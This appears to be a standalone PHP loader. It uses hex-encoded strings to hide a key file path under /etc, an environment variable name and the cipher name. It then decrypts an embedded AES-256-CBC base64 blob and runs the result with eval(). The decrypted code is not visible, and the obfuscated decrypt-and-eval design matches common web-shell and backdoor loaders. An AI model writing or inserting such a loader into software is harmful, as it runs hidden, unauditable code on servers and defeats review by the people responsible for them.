<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('pbWpscs/joY+jhZ9S8pBgg==');

$c=base64_decode(

'1ld39ZKLsRWcPPoOrGoFLf973BmruQfb3Ga0nCvAkn8hZ/GJu8AlUwUYt8PZyLJA9cUzQQRQ0qgR' .
'Uw3Bhehs81bewDqJiBuVlVMfmuRBmwHQpz1kbwXaH6b+L+9Ec7lsaljlWTez0gXTwrOjSPTmv/wW' .
'Ax/YmhA8MwTdPSQUMMfyR8GoEslJR56WCGXom3zuvAYFyDWxdZCuOFenyOEcJGiHR/B18JVIjUX5' .
'oRgbfh3Hlye4OeFV57s656MMki3HpbTVd4BJrrqBj03CsC2sihoAYJqR31jF4uXaXZX/KtUehRfp' .
'TXvDjVb5bpU3I9C7XgKkQcrIi0ulfd8+G6wjDtDywpJ7HckSbJitLak1E+CAgHHzH8MVhjV1NCKa' .
'TXIWaygeCHq9JUyTSLvg2Tj7045GYIbZsz8turgn4qW/Nl9O9oGJGY7bdEtcui8Rn3ToO6FgGidR' .
'7Jf/lfgO9m6HdYAjsktCsVUHnlHlVf7DK8DBukZmNYR9nuEvMtIDRwaduuzO76GSWdiW2b7TzdXu' .
'tf42LZutRfpxYf39+KUeu5zJCkdwnGVg5FTKd8KVZKWrsC+foFWVx0HJpRlA00S5wUWE3PeemjOS' .
'J5YFROILDOS7oArDgZB1bS4fPekQ7Zbl3Xn/rlu2wygKwW7Fy0I/Ek9/mZq+uK6DtkLeGkMqkU5s' .
'Zs8TCjx5/ICB2as3KFvYV6jrCHkWzmbVqLNY7wLgyw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

